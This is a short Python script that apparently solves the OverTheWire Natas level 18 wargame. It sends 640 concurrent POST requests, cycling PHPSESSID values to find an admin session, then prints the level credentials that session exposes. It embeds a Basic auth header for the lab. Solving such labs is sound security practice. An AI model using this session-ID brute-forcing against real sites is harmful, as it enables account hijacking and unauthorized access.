import requests_futures.sessions
from concurrent.futures import ThreadPoolExecutor

session = requests_futures.sessions.FuturesSession(executor=ThreadPoolExecutor(max_workers=640))
res = []
total_sessions = 640

url = "http://natas18.natas.labs.overthewire.org:80/index.php"

natas18_cookies = {"__utma": "176859643.1576322311.1574691834.1574696384.1574698992.3", "__utmz": "176859643.1574691834.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)", "PHPSESSID": "123"}

natas18_hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://natas18.natas.labs.overthewire.org/index.php", "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

natas18_data = {"username": "user", "password": "pass"}

for i in range(total_sessions):
	natas18_cookies['PHPSESSID'] = str(i)
	res.append(session.post(url, headers=natas18_hdrs, cookies=natas18_cookies, data=natas18_data))

print('Finished requests, checking responses')

for j in range(total_sessions):
	if ('You are an admin. The credentials for the next level are:<br>' in res[j].result().text):
		print(res[j].result().text)
		print((res[j].result().request.headers['Cookie']))
		break

